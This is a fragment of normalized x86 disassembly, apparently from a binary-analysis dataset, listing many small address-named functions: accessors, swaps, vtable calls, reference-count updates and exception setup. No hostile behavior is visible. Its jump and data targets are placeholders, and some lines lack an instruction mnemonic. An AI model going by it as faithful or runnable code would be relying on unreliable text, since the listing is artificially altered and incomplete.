mov ebp esp
push [ ebp + 0x8 ]
call sub_406fab
pop ebp
retn
sub_406d36
add eax 0xc
retn
sub_406d3a
retn
sub_406d3b
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_406d4c
push ebp
mov ebp esp
and [ esi + 0x4 ] 0x0
push ebx
push [ ebp + 0x8 ]
lea ebx [ esi + 0x8 ]
mov [ esi ] r--data
call sub_405317
mov eax esi
pop ebx
pop ebp
retn 0x4
sub_406d6c
push ebp
mov ebp esp
mov ecx [ ecx + 0x20c ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x8 ]
sub_406d7b
push ebp
mov ebp esp
mov ecx [ ecx + 0x20c ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x10 ]
sub_406d8a
push ebp
mov ebp esp
push edi
push [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
add ecx 0x8
push ecx
call sub_406e7c
pop edi
pop ebp
retn 0x8
sub_406dbd
mov [ ecx ] r--data
retn
sub_406dfb
push edi
mov edi ecx
call sub_40711b
mov eax edi
pop edi
retn
sub_406e32
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_406e5d
lea ecx [ esi + 0x208 ]
call sub_402f60
mov [ esi ] r--data
retn
sub_406e6f
push ebp
mov ebp esp
xor eax eax
cmp cl [ ebp + 0x8 ]
setle al
pop ebp
retn
sub_407140
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_407155
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2fe
pop esi
sub_407166
mov edx [ ecx ]
push esi
mov esi [ eax ]
mov [ ecx ] esi
mov [ eax ] edx
pop esi
retn
sub_407171
and [ eax ] 0x0
retn
sub_407175
push 0x4
mov eax sub_44e167
call sub_448595
mov ebx [ ebp + 0x8 ]
and [ ebx ] 0x0
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_407bf1
mov eax ebx
call sub_44866d
retn 0x8
sub_40719d
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_407875
mov [ esi ] eax
mov eax esi
pop ebp
retn 0x4
sub_4071b0
add eax 0xc
retn
sub_4071b4
call sub_403b02
xor ecx ecx
test eax eax
sets al
retn
sub_4071c1
mov eax [ eax ]
add eax 0xc
retn
sub_4071c7
push ebp
mov ebp esp
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4078b0
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn 0xc
sub_4071e1
xor eax eax
cmp [ ecx + 0xc ] eax
sete al
retn
sub_407231
push ebp
mov ebp esp
mov ecx [ eax + 0x20c ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
pop ebp
retn 0x8
sub_407246
push ebp
mov ebp esp
mov ecx [ eax + 0x20c ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
pop ebp
retn 0x8
sub_40725b
and [ eax ] 0x0
retn
sub_40725f
retn 0x4
sub_407262
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_4072f3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_407304
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_407925
pop ebp
retn 0x8
sub_40731c
push esi
lea esi [ eax + 0x60 ]
mov ecx esi
call sub_4079d7
push esi
mov [ esi ] r--data
call sub_446d07
pop ecx
pop esi
retn
sub_407336
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
call sub_40379c
sub_407345
and [ eax ] 0x0
retn
sub_407349
push 0x4
mov eax sub_44e144
call sub_448595
mov ebx [ ebp + 0x8 ]
and [ ebx ] 0x0
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_407bf1
mov eax ebx
call sub_44866d
retn 0x8
sub_40748d
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
push 0x1
or eax 0x4
call sub_404912
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
sub_407500
push ebp
mov ebp esp
mov ecx [ eax + 0x204 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x8 ]
sub_40750f
push ebp
mov ebp esp
mov ecx [ eax + 0x204 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x10 ]
sub_40751e
mov ecx [ eax + 0x200 ]
mov [ esi ] ecx
call sub_402eaf
mov eax esi
retn
sub_40752e
and [ eax ] 0x0
retn
sub_407532
push 0x4
mov eax sub_44e121
call sub_448595
mov ebx [ ebp + 0x8 ]
and [ ebx ] 0x0
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_407bf1
mov eax ebx
call sub_44866d
retn 0x8
sub_4077d0
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_4077d8
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_4077de
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_4077e6
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_4077ec
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_407801
mov eax [ eax ]
retn
sub_407804
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0x9c
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_407823
mov edx [ ecx ]
push esi
mov esi [ eax ]
mov [ ecx ] esi
mov [ eax ] edx
pop esi
retn
sub_40782e
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0x9c
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_40786c
xor eax eax
cmp [ ecx ] eax
setne al
dec eax
retn
sub_4078aa
mov eax [ eax ]
add eax 0xc
retn
sub_4078ea
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_4078f2
push ebp
mov ebp esp
call sub_407e47
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_407902
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_407917
mov edx [ ecx ]
push esi
mov esi [ eax ]
mov [ ecx ] esi
mov [ eax ] edx
pop esi
retn
sub_407922
retn 0x4
sub_407a0f
mov eax [ ecx - 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x18 ] r--data
retn
sub_407a3a
mov eax [ eax ]
add eax 0xc
retn
sub_407a40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_407f40
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_407a52
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_407a90
retn
sub_407a91
push edi
mov edi eax
lea eax [ edi + 0x8 ]
call sub_40a30e
call sub_407f79
mov eax edi
pop edi
retn
sub_407aa5
mov eax [ eax ]
jmp sub_408952
sub_407b65
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
call sub_40379c
sub_407b74
push esi
lea esi [ eax + 0x18 ]
mov ecx esi
call sub_407a0f
push esi
mov [ esi ] r--data
call sub_446d07
pop ecx
pop esi
retn
j_sub_408a83
jmp sub_408a83
sub_407bdf
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
retn
dec eax
mov [ ecx + 0x10 ] eax
jne r-xdata
and [ ecx + 0xc ] 0x0
sub_407d9b
mov eax [ eax + 0x28 ]
retn
sub_407d9f
retn
sub_407da0
push 0x0
mov eax sub_44deab
call sub_448595
and [ ebp - 0x4 ] 0x0
lea esi [ ebp + 0x8 ]
call sub_40dfbb
or [ ebp - 0x4 ] 0xffffffff
mov eax esi
push eax
call sub_407d32
call sub_44866d
retn 0x50
sub_407e43
mov eax [ eax + 0x4 ]
retn
sub_407e66
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_407e6e
and [ eax ] 0x0
retn
sub_407e72
mov edx [ ecx ]
mov [ eax ] edx
and [ ecx ] 0x0
retn
sub_407eba
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_407ec2
mov eax [ eax + 0x8 ]
retn
sub_407f33
mov [ eax ] ecx
retn
sub_407f36
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_407f76
mov [ eax ] ecx
retn
sub_408010
retn
sub_408011
retn
sub_408012
mov [ ecx ] r--data
retn
sub_408944
test ecx ecx
mov [ eax ] ecx
sete cl
mov [ eax + 0x4 ] cl
retn
sub_40894f
mov [ eax ] ecx
retn
sub_408952
push 0x3
mov [ eax ] 0x0
pop ecx
or [ eax + ecx * 8 + 0x8 ] 0xffffffff
or [ eax + ecx * 8 + 0xc ] 0xffffffff
dec ecx
jns r-xdata
retn
sub_4089c7
push ebp
mov ebp esp
pop ebp
jmp sub_408b7e
sub_4089d0
push ebp
mov ebp esp
pop ebp
jmp sub_408bc4
sub_4089fc
push ebp
mov ebp esp
pop ebp
jmp sub_4056b5
sub_408a05
push 0x0
call sub_405352
retn
sub_408a0d
push 0x0
mov eax sub_44a6eb
call sub_448595
mov eax [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax + ecx ] r--data
call sub_44866d
retn 0x4
sub_408a73
push 0x3
pop ecx
or [ eax + ecx * 8 ] 0xffffffff
or [ eax + ecx * 8 + 0x4 ] 0xffffffff
dec ecx
jns r-xdata
retn
sub_408a83
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0xc ]
call sub_409900
mov edx eax
lea eax [ ebp - 0x18 ]
call sub_40a167
call sub_40a3ef
leave
retn
sub_408aa2
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
retn
dec eax
mov [ ecx + 0x10 ] eax
jne r-xdata
and [ ecx + 0xc ] 0x0
sub_408ab4
xor eax eax
cmp [ ecx ] eax
setne al
dec eax
retn
j_sub_40782e
jmp sub_40782e
sub_408ac2
push ebp
mov ebp esp
push ecx
push esi
sub esp 0x50
mov esi esp
mov [ ebp - 0x4 ] esp
call sub_407c93
call sub_407da0
pop esi
leave
retn
sub_408b75
xor eax eax
cmp [ ecx + 0x18 ] eax
setne al
retn
sub_408bb7
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov eax ecx
retn
sub_408e5a
retn
sub_408e7d
xor eax eax
cmp [ ecx ] eax
setne al
dec eax
retn
sub_408e86
and [ eax ] 0x0
retn
sub_408e8a
and [ eax ] 0x0
retn
sub_408e8e
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_408ea3
and [ eax ] 0x0
retn
sub_408ea7
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_408ebc
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c339
pop esi
sub_408ecd
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_408f29
mov esi [ ebp + 0x8 ]
call sub_409b1b
xor ebx ebx
push ebx
push ebx
call sub_426f77
int3
j_sub_409b1b
jmp sub_409b1b
sub_408f40
mov ecx [ eax ]
xor edx edx
add ecx 0x28
inc edx
[ ecx ] edx
retn
sub_408f4d
mov ecx [ eax ]
xor edx edx
add ecx 0x28
inc edx
[ ecx ] edx
retn
sub_408f5a
mov edx [ ecx ]
push esi
mov esi [ eax ]
mov [ ecx ] esi
mov [ eax ] edx
pop esi
retn
sub_408f65
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_408f6b
mov al [ eax ]
retn
sub_408f6e
mov [ eax ] ecx
retn
sub_408f71
mov ecx [ eax ]
mov [ esi ] ecx
call sub_40a30e
mov eax esi
retn
sub_408f7d
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_408f87
mov [ eax ] ecx
retn
sub_408f8a
mov eax [ eax ]
add eax 0xc
retn
sub_409895
retn
sub_409896
retn
sub_409897
push ebp
mov ebp esp
pop ebp
jmp sub_4056b5
sub_4098e6
push ebp
mov ebp esp
push 0x3
pop eax
mov edx [ ebp + 0x8 ]
mov [ ecx + eax * 8 ] edx
dec eax
mov edx [ ebp + 0xc ]
mov [ ecx + eax * 8 + 0xc ] edx
jns r-xdata
pop ebp
retn 0x8
sub_409900
mov ecx [ edx + 0x10 ]
add ecx [ edx + 0xc ]
mov edx [ edx ]
and [ eax + 0x4 ] 0x0
mov [ eax ] edx
mov [ eax + 0x8 ] ecx
retn
sub_409912
xor eax eax
cmp [ ecx + 0x10 ] eax
sete al
retn
sub_409989
push [ eax + 0x4 ]
call sub_424fc7
pop ecx
retn
sub_4099ab
xor eax eax
cmp [ ecx + 0x8 ] eax
sete al
retn
sub_4099f7
mov eax [ eax + 0x4 ]
add eax 0x8
retn
sub_4099fe
mov eax [ eax + 0x4 ]
add eax 0x4
retn
sub_409a61
push [ eax + 0x4 ]
call sub_424fc7
pop ecx
retn
sub_409a6b
add eax 0x14
retn
sub_409a6f
add eax 0x15
retn
sub_409a73
add eax 0x4
retn
sub_409a77
add eax 0x8
retn
sub_409a7b
add eax 0xc
retn
sub_409a7f
jmp r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov eax ecx
retn
sub_409a8d
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov eax ecx
retn
sub_409a9a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_409aaa
mov edx [ ecx ]
mov [ eax ] edx
and [ eax + 0x4 ] 0x0
mov edx [ ecx + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
mov [ ecx + 0x4 ] esi
mov [ eax + 0x4 ] edx
and [ ecx ] 0x0
pop esi
retn
sub_409ac4
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_409ac9
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_409acf
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x5
retn
sub_409b3e
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn 0x4
sub_409b4b
retn
sub_409b4c
retn
sub_409b4d
retn
sub_409b4e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_40a30e
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_409b60
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_409b6a
mov eax [ eax ]
add eax 0xc
retn
sub_409b70
mov eax [ eax ]
retn
sub_40a143
push esi
mov esi eax
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
pop esi
retn
call sub_40a3af
sub_40a156
push esi
mov esi eax
call sub_40a392
mov eax esi
pop esi
retn
j_sub_40a3ef
jmp sub_40a3ef
sub_40a196
mov [ ecx ] r--data
retn
sub_40a19d
mov al 0x1
retn
sub_40a1a0
mov ecx edi
mov eax esi
call sub_402ca2
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax esi
retn
sub_40a1d2
mov ecx edi
mov eax esi
call sub_402ca2
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax esi
retn
sub_40a1e4
retn
sub_40a1e5
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a41f
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
j_sub_40a6cf
jmp sub_40a6cf
sub_40a266
retn
sub_40a27f
mov eax [ eax + 0x8 ]
retn
sub_40a2d2
retn
sub_40a2d3
mov eax 0x7ffffff
retn
sub_40a2d9
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40b740
pop ecx
pop ebp
retn 0x4
sub_40a2e9
push r--data
call sub_446a95
sub_40a2f4
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_40a304
test eax eax
jne r-xdata
jmp sub_40b75e
retn
sub_40a392
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
retn
call sub_404a5c
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x4 ] 0x0
retn
sub_40a3cf
push ebp
mov ebp esp
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8 ] ecx
pop ebp
retn 0x4
mov ecx [ ecx ]
mov [ eax ] ecx
sub_40a3eb
dec [ eax + 0x8 ]
retn
sub_40a41b
mov [ eax ] ecx
retn
sub_40a41e
retn
sub_40a456
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ ecx ]
push ecx
push edx
lea esi [ ebp + 0xc ]
call sub_40a217
push 0x0
push 0x0
call sub_426f77
int3
sub_40a71e
retn
sub_40a774
retn
sub_40a775
mov eax 0x7ffffff
retn
sub_40a77b
mov ecx [ eax ]
mov [ esi ] ecx
call sub_407f40
mov eax esi
retn
sub_40a787
dec [ eax + 0x8 ]
retn
sub_40a78b
push ebp
mov ebp esp
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8 ] ecx
pop ebp
retn 0x4
mov ecx [ ecx ]
mov [ eax ] ecx
sub_40a7dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_40a943
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40a7ee
retn
sub_40a7ef
retn
sub_40a8d2
add eax 0x14
retn
sub_40a8d6
jmp r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov eax ecx
retn
sub_40a8e4
retn 0x4
sub_40a8e7
xor eax eax
inc eax
jmp sub_40b7b2
sub_40a92c
retn 0x4
sub_40a92f
xor eax eax
inc eax
jmp sub_40b7f5
sub_40a937
mov eax [ eax ]
retn
sub_40a93a
test eax eax
je r-xdata
retn
mov eax [ eax ]
mov [ ecx ] eax
sub_40a969
mov eax [ eax + 0x8 ]
retn
sub_40a9db
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
call sub_4063f4
push 0x0
push 0x0
call sub_426f77
int3
sub_40a9f0
retn 0x4
sub_40a9f3
retn 0x4
sub_40aa3e
push ebp
mov ebp esp
push [ ebp + 0x8 ]
and [ esi + 0x10 ] 0x0
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
push esi
mov [ esi ] 0x0
call sub_40d172
mov eax esi
pop ebp
retn 0x4
sub_40b138
retn
sub_40b139
retn
sub_40b13a
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
call sub_40379c
j_sub_40c2c3
jmp sub_40c2c3
sub_40b14e
push ebp
mov ebp esp
push [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
call sub_40d6e1
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40be52
mov eax [ ebp + 0xc ]
pop ebp
retn 0x10
sub_40b171
retn
sub_40b172
mov eax [ eax + 0x8 ]
xor ecx ecx
cmp eax [ edx + 0x8 ]
setne al
retn
sub_40b17e
xor ecx ecx
inc ecx
[ eax ] ecx
retn
j_sub_40c2fe
jmp sub_40c2fe
sub_40b18b
retn
sub_40b18c
call sub_403b02
xor ecx ecx
test eax eax
sets al
retn
sub_40b199
retn
sub_40b19a
push ebp
mov ebp esp
mov ecx [ eax ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x4 ]
sub_40b1a5
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40b280
mov eax [ eax ]
retn
sub_40b41d
xor ecx ecx
inc ecx
[ eax ] ecx
retn
sub_40b425
retn
sub_40b426
push edi
mov edi eax
lea eax [ edi + 0x8 ]
call sub_40a30e
call sub_407f79
pop edi
retn
j_sub_40dfbb
jmp sub_40dfbb
j_sub_40c11d
jmp sub_40c11d
sub_40b6cc
retn
sub_40b6cd
retn
sub_40b6ce
add eax 0x4
jmp sub_403855
sub_40b6d6
xor ecx ecx
inc ecx
[ eax ] ecx
retn
j_sub_40c339
jmp sub_40c339
sub_40b6e3
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f8de
add esp 0x10
pop ebp
retn 0xc
sub_40b6fe
xor ecx ecx
add eax 0x28
inc ecx
[ eax ] ecx
retn
sub_40b709
call sub_40c11d
xor ecx ecx
test al al
sete al
retn
sub_40b716
retn
sub_40b7a0
mov al 0x1
retn
sub_40b7a3
retn
sub_40b7a4
mov edx [ ecx ]
push esi
mov esi [ eax ]
mov [ ecx ] esi
mov [ eax ] edx
pop esi
retn
sub_40b7af
retn
sub_40b7b0
retn
sub_40b7b1
retn
sub_40b7f4
retn
sub_40b837
xor al al
retn
sub_40b85d
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
j_sub_40cc34
jmp sub_40cc34
j_sub_40cc34#3
jmp sub_40cc34
sub_40b8b9
push ebp
mov ebp esp
pop ebp
jmp sub_40ba8e
sub_40b8c2
push esi
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop esi
retn
call sub_40379c
sub_40b8f4
add eax 0x4
jmp sub_403855
sub_40b8fc
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_40b90f
push ebp
mov ebp esp
pop ebp
jmp sub_40ba8e
sub_40b918
push esi
mov esi eax
call sub_407ad2
mov eax esi
pop esi
retn
sub_40babd
retn
sub_40babe
xor ecx ecx
add eax 0x28
inc ecx
[ eax ] ecx
retn
sub_40bc6b
xor eax eax
inc eax
call sub_40b7b2
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0x14 ] 0x0
retn
sub_40be2c
add eax 0x4
jmp sub_403855
sub_40be34
mov eax [ eax ]
retn
sub_40be37
mov ecx [ eax ]
and [ eax ] 0x0
mov eax [ edi ]
mov [ edi ] ecx
test eax eax
je r-xdata
mov eax edi
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c339
pop esi
sub_40be51
retn
sub_40c084
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
pop ebp
retn
sub_40c091
retn
sub_40c092
push edi
mov edi eax
lea eax [ edi + 0x8 ]
call sub_40a30e
call sub_407f79
pop edi
retn
sub_40c0a4
mov al [ eax + 0x20 ]
retn
sub_40c1c7
retn
sub_40c1c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_40e12f
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40c1da
xor edx edx
push 0x3
mov [ eax ] dl
pop ecx
dec ecx
mov [ eax + ecx * 8 + 0x10 ] edx
mov [ eax + ecx * 8 + 0x14 ] edx
jns r-xdata
retn
sub_40c1ed
push esi
call sub_40cb79
xor ecx ecx
push 0x3
mov [ esi + 0x10 ] cl
pop eax
dec eax
mov [ esi + eax * 8 + 0x20 ] ecx
mov [ esi + eax * 8 + 0x24 ] ecx
jns r-xdata
mov eax esi
retn
sub_40c209
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
j_sub_40cc34#2
jmp sub_40cc34
sub_40c23e
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x8 ]
call sub_407804
mov eax [ ebp + 0x8 ]
call sub_40dd62
pop esi
pop ebp
retn 0x4
sub_40c257
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x8 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_40c26c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_40c27d
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_40cc78
pop ebp
retn 0x8
sub_40c295
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_40c2aa
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40c2bb
xor ecx ecx
inc ecx
[ eax ] ecx
retn
sub_40c2f6
xor ecx ecx
inc ecx
[ eax ] ecx
retn
sub_40c331
xor ecx ecx
inc ecx
[ eax ] ecx
retn
sub_40c36c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40cb79
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40c39e
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_40c3a9
mov [ eax ] r--data
retn
sub_40c400
mov [ eax ] r--data
retn
sub_40c407
push 0x3
pop ecx
and [ eax + ecx * 8 ] 0x0
and [ eax + ecx * 8 + 0x4 ] 0x0
dec ecx
jns r-xdata
retn
sub_40c464
push [ esi ]
call sub_424fc7
and [ esi ] 0x0
pop ecx
retn
sub_40c470
retn
sub_40c659
add eax 0xc
retn
sub_40c65d
retn
sub_40c65e
mov eax [ eax + 0x4 ]
cmp eax [ ecx + 0x4 ]
sbb eax eax
neg eax
retn
sub_40c851
add eax 0xc
retn
sub_40c855
retn
sub_40c856
mov eax [ eax + 0x4 ]
cmp eax [ ecx + 0x4 ]
sbb eax eax
neg eax
retn
sub_40c861
mov edx [ ecx ]
mov [ eax ] edx
and [ ecx ] 0x0
retn
sub_40c869
mov edx [ ecx ]
push esi
mov esi [ eax ]
mov [ ecx ] esi
mov [ eax ] edx
pop esi
retn
sub_40c874
mov eax [ eax + 0x8 ]
retn
sub_40ca56
and [ eax ] 0x0
retn
sub_40ca5a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_40cdae
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40ca6c
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_40ca7f
and [ eax ] 0x0
retn
sub_40caa6
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_40caae
and [ eax ] 0x0
retn
sub_40cadc
and [ eax ] 0x0
retn
sub_40cae0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_40ce08
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40caf2
and [ eax ] 0x0
retn
sub_40caf6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_40ce4d
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40cb08
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_4466a8
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
retn
sub_40cb20
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40cb33
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_40cb6b
push esi
mov esi eax
call sub_407ad2
mov eax esi
pop esi
retn
sub_40cb77
retn
sub_40cb78
retn
sub_40cbcb
mov esi [ ebp + 0x8 ]
call sub_40cc34
push 0x0
push 0x0
call sub_426f77
int3
sub_40cc66
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn 0x4
sub_40cc73
retn
sub_40cc74
retn
sub_40cc75
retn 0x4
sub_40cd20
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_40cd30
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_40cd40
